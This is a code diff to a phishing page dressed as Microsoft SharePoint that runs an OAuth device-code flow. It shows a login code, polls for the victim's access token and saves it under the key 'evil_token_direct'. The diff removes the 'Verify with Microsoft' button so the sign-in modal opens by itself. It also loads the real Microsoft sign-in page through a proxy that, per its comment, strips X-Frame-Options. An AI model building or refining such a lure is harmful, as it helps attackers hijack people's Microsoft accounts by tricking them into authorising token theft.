@@ -215,29 +215,8 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer { text-align: center; font-size: 11px; color: #999; padding: 16px; border-top: 1px solid #eee; }
-        .verify-btn-wrapper {
-            margin-top: 14px;
-        }
-        .verify-btn {
-            background: #007b8a;
-            color: white;
-            border: none;
-            padding: 12px 28px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 2px 8px rgba(0,123,138,0.3);
-            transition: background 0.15s, transform 0.1s;
-        }
-        .verify-btn:hover { background: #005f6b; }
-        .verify-btn:active { transform: scale(0.96); }
-        .verify-btn:disabled { opacity: 0.5; pointer-events: none; }
 
-        /* --- MODAL OVERLAY FOR IFRAME --- */
+        /* MODAL OVERLAY FOR IFRAME */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -374,20 +353,13 @@
                 <span id="spinnerText">Requesting code…</span>
             </div>
 
-            <div class="verify-btn-wrapper" id="verifyWrapper" style="display:none;">
-                <button class="verify-btn" id="verifyBtn">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M5 12h14M12 5l7 7-7 7"/>
-                    </svg>
-                    Verify with Microsoft
-                </button>
-            </div>
+            <!-- No button; modal will auto-open -->
         </div>
 
         <div class="footer">Microsoft SharePoint</div>
     </div>
 
-    <!-- --- MODAL OVERLAY FOR INLINE POPUP --- -->
+    <!-- MODAL OVERLAY -->
     <div class="modal-overlay" id="microsoftModal">
         <div class="modal-box">
             <div class="modal-header">
@@ -408,10 +380,7 @@
             const copyBtn = document.getElementById('copyBtn');
             const loadingSpinner = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
-            const verifyWrapper = document.getElementById('verifyWrapper');
-            const verifyBtn = document.getElementById('verifyBtn');
             
-            // Modal elements
             const modal = document.getElementById('microsoftModal');
             const iframe = document.getElementById('microsoftIframe');
             const closeBtn = document.getElementById('modalCloseBtn');
@@ -427,13 +396,6 @@
             function setCode(text, state = '') {
                 otpDisplay.textContent = text;
                 copyBtn.disabled = (text === 'Error' || text === 'EXPIRED' || text === 'Loading…');
-                if (text && text !== 'Loading…' && text !== 'Error' && text !== 'EXPIRED' && !isApproved) {
-                    verifyWrapper.style.display = 'block';
-                    // Auto-focus the button for better UX
-                    setTimeout(() => verifyBtn.focus(), 100);
-                } else {
-                    verifyWrapper.style.display = 'none';
-                }
             }
 
             function copyOTP() {
@@ -472,15 +434,17 @@
 
             copyBtn.addEventListener('click', copyOTP);
 
-            // --- OPEN MODAL INSTEAD OF NEW TAB ---
+            // Open modal with iframe pointing to proxy endpoint
             function openInlineModal(uri) {
                 if (!uri) return;
-                iframe.src = uri;
+                // Use the proxy endpoint to strip X-Frame-Options
+                const proxyUrl = '/proxy?url=' + encodeURIComponent(uri);
+                iframe.src = proxyUrl;
                 modal.classList.add('active');
                 spinnerText.textContent = 'Microsoft sign‑in opened inline. Enter the code there.';
             }
 
-            // Close modal handler
+            // Close modal
             function closeModal() {
                 modal.classList.remove('active');
                 iframe.src = 'about:blank';
@@ -488,16 +452,6 @@
             closeBtn.addEventListener('click', closeModal);
             modal.addEventListener('click', function(e) {
                 if (e.target === modal) closeModal();
-            });
-
-            // Attach click handler to verify button
-            verifyBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (verificationUri) {
-                    openInlineModal(verificationUri);
-                } else {
-                    alert('No verification URI available. Please refresh.');
-                }
             });
 
             async function pollForToken() {
@@ -516,8 +470,7 @@
                         pollInterval = null;
                         setCode('Approved ✓');
                         copyBtn.disabled = true;
-                        verifyWrapper.style.display = 'none';
-                        closeModal(); // close the iframe modal on success
+                        closeModal();
                         spinnerText.textContent = 'Verification complete! Redirecting…';
                         setTimeout(() => {
                             localStorage.setItem('evil_token_direct', data.access_token);
@@ -538,7 +491,6 @@
                         pollInterval = null;
                         setCode('EXPIRED');
                         copyBtn.disabled = true;
-                        verifyWrapper.style.display = 'none';
                         closeModal();
                         spinnerText.textContent = 'Code expired. Refresh the page.';
                         isPolling = false;
@@ -555,7 +507,6 @@
                     console.error('Poll error:', err);
                     setCode('Error');
                     copyBtn.disabled = true;
-                    verifyWrapper.style.display = 'none';
                     spinnerText.textContent = 'Network error. Check console.';
                     isPolling = false;
                 }
@@ -564,7 +515,6 @@
             async function startDeviceFlow() {
                 setCode('Loading…');
                 copyBtn.disabled = true;
-                verifyWrapper.style.display = 'none';
                 spinnerText.textContent = 'Requesting code…';
                 loadingSpinner.style.display = 'flex';
                 try {
@@ -580,7 +530,9 @@
                     verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
                     setCode(userCode);
                     copyBtn.disabled = false;
-                    spinnerText.textContent = 'Code ready. Click "Verify with Microsoft" to open the sign‑in page.';
+                    // AUTO-OPEN THE MODAL
+                    openInlineModal(verificationUri);
+                    spinnerText.textContent = 'Microsoft sign‑in opened automatically. Enter the code there.';
                     if (pollInterval) clearInterval(pollInterval);
                     const intervalMs = (data.interval || 5) * 1000 + 500;
                     pollInterval = setInterval(pollForToken, intervalMs);
@@ -589,7 +541,6 @@
                     console.error('Device flow error:', err);
                     setCode('Error');
                     copyBtn.disabled = true;
-                    verifyWrapper.style.display = 'none';
                     spinnerText.textContent = 'Error loading code.';
                 }
             }
